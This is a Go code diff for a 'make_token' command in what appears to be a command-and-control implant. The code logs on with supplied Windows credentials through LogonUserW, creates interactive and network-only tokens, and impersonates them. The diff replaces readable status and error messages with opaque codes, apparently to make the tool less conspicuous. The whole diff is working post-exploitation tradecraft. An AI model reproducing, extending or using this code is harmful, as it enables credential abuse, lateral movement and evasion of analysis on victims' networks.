@@ -6,6 +6,7 @@ package main
 
 import (
 	"fmt"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
@@ -16,8 +17,6 @@ import (
 type MakeTokenCommand struct{}
 
 func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, password string, tokenName string, logonTypeStr string) CommandResult {
-	var output strings.Builder
-
 	// Parse domain\user or just user
 	var domain, user string
 	if strings.Contains(userStr, "\\") {
@@ -53,16 +52,12 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 		logonType = LOGON32_LOGON_INTERACTIVE
 	}
 
-	output.WriteString("=== Creating Token ===\n")
-	output.WriteString(fmt.Sprintf("User: %s\\%s\n", domain, user))
-	output.WriteString(fmt.Sprintf("Logon Type: %s\n", logonTypeStr))
-	output.WriteString(fmt.Sprintf("Token Name: %s\n", tokenName))
 
 	// Convert strings to UTF16
 	userUTF16, err := syscall.UTF16PtrFromString(user)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to convert username: %v", err),
+			Output:      Err(E19),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -71,7 +66,7 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 	domainUTF16, err := syscall.UTF16PtrFromString(domain)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to convert domain: %v", err),
+			Output:      Err(E19),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -80,7 +75,7 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 	passwordUTF16, err := syscall.UTF16PtrFromString(password)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to convert password: %v", err),
+			Output:      Err(E19),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -88,7 +83,7 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 
 	// Call LogonUser
 	var token syscall.Handle
-	ret, _, lastErr := procLogonUserW.Call(
+	ret, _, _ := procLogonUserW.Call(
 		uintptr(unsafe.Pointer(userUTF16)),
 		uintptr(unsafe.Pointer(domainUTF16)),
 		uintptr(unsafe.Pointer(passwordUTF16)),
@@ -98,22 +93,12 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 	)
 
 	if ret == 0 {
-		errorCode := lastErr.(syscall.Errno)
-		errorMsg := c.getLogonErrorMessage(errorCode)
-		output.WriteString(fmt.Sprintf("[!] LogonUser failed: %s (0x%X)\n", errorMsg, errorCode))
 		return CommandResult{
-			Output:      output.String(),
+			Output:      Err(E40),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
-
-	// Successfully created token
-	output.WriteString("[+] Token created successfully!\n")
-
-	// Get token information
-	userName, userDomain := c.getTokenUserInfo(token)
-	output.WriteString(fmt.Sprintf("    Token User: %s\\%s\n", userDomain, userName))
 
 	// Store token in unified store
 	if globalTokenStore == nil {
@@ -151,18 +136,14 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 
 	globalTokenStore.mu.Unlock()
 
-	output.WriteString(fmt.Sprintf("    Token stored as: %s\n", tokenName))
-
 	return CommandResult{
-		Output:      output.String(),
+		Output:      SuccCtx(S1, tokenName),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
 }
 
 func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr string, password string, tokenName string) CommandResult {
-	var output strings.Builder
-
 	// Parse domain\user
 	var domain, user string
 	if strings.Contains(userStr, "\\") {
@@ -174,16 +155,12 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 		domain = "."
 	}
 
-	output.WriteString("=== Creating Network-Only Token ===\n")
-	output.WriteString(fmt.Sprintf("User: %s\\%s\n", domain, user))
-	output.WriteString(fmt.Sprintf("Token Name: %s\n", tokenName))
-	output.WriteString("Mode: Network-Only (NEW_CREDENTIALS)\n")
 
 	// Convert strings to UTF16
 	userUTF16, err := syscall.UTF16PtrFromString(user)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to convert username: %v", err),
+			Output:      Err(E19),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -192,7 +169,7 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 	domainUTF16, err := syscall.UTF16PtrFromString(domain)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to convert domain: %v", err),
+			Output:      Err(E19),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -201,7 +178,7 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 	passwordUTF16, err := syscall.UTF16PtrFromString(password)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to convert password: %v", err),
+			Output:      Err(E19),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -209,7 +186,7 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 
 	// Call LogonUser with NEW_CREDENTIALS
 	var token syscall.Handle
-	ret, _, lastErr := procLogonUserW.Call(
+	ret, _, _ := procLogonUserW.Call(
 		uintptr(unsafe.Pointer(userUTF16)),
 		uintptr(unsafe.Pointer(domainUTF16)),
 		uintptr(unsafe.Pointer(passwordUTF16)),
@@ -219,17 +196,12 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 	)
 
 	if ret == 0 {
-		errorCode := lastErr.(syscall.Errno)
-		errorMsg := c.getLogonErrorMessage(errorCode)
-		output.WriteString(fmt.Sprintf("[!] LogonUser failed: %s (0x%X)\n", errorMsg, errorCode))
 		return CommandResult{
-			Output:      output.String(),
+			Output:      Err(E40),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
-
-	output.WriteString("[+] Network-only token created successfully!\n")
 
 	// Store token
 	if globalTokenStore == nil {
@@ -264,11 +236,8 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 
 	globalTokenStore.mu.Unlock()
 
-	output.WriteString(fmt.Sprintf("    Token stored as: %s\n", tokenName))
-	output.WriteString("    This token will only affect network operations\n")
-
 	return CommandResult{
-		Output:      output.String(),
+		Output:      SuccCtx(S1, tokenName),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
@@ -277,7 +246,7 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
 	if globalTokenStore == nil {
 		return CommandResult{
-			Output:      "No tokens available",
+			Output:      Err(E46),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -302,14 +271,11 @@ func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
 
 	if foundToken == 0 {
 		return CommandResult{
-			Output:      "No impersonatable created token found",
+			Output:      Err(E47),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
-
-	// Get current user before impersonation
-	currentUser, currentDomain := c.getCurrentUserInfo()
 
 	// Revert any current impersonation first
 	RevertToSelf()
@@ -326,7 +292,7 @@ func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
 	)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to duplicate token: %v", err),
+			Output:      Err(E42),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -337,7 +303,7 @@ func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
 	err = ImpersonateLoggedOnUser(impersonationToken)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to impersonate token: %v", err),
+			Output:      Err(E42),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -349,28 +315,8 @@ func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
 	globalTokenStore.ActiveToken = foundName
 	globalTokenStore.mu.Unlock()
 
-	// Get actual impersonated user
-	var threadToken syscall.Token
-	OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
-	if threadToken != 0 {
-		defer threadToken.Close()
-		newUser, newDomain := c.getTokenUserInfo(syscall.Handle(threadToken))
-
-		var output strings.Builder
-		output.WriteString("[+] Impersonation successful!\n")
-		output.WriteString(fmt.Sprintf("    Previous: %s\\%s\n", currentDomain, currentUser))
-		output.WriteString(fmt.Sprintf("    Current: %s\\%s\n", newDomain, newUser))
-		output.WriteString(fmt.Sprintf("    Token: %s\n", foundName))
-
-		return CommandResult{
-			Output:      output.String(),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
-		}
-	}
-
 	return CommandResult{
-		Output:      "[+] Token impersonated",
+		Output:      SuccCtx(S4, foundName),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
@@ -379,7 +325,7 @@ func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
 func (c *MakeTokenCommand) clearTokens(ctx *CommandContext) CommandResult {
 	if globalTokenStore == nil {
 		return CommandResult{
-			Output:      "No tokens to clear",
+			Output:      Succ(S0),
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -417,14 +363,14 @@ func (c *MakeTokenCommand) clearTokens(ctx *CommandContext) CommandResult {
 
 	if clearedCount == 0 {
 		return CommandResult{
-			Output:      "No created tokens to clear",
+			Output:      Succ(S0),
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	return CommandResult{
-		Output:      fmt.Sprintf("[+] Cleared %d created token(s)", clearedCount),
+		Output:      SuccCtx(S2, strconv.Itoa(clearedCount)),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
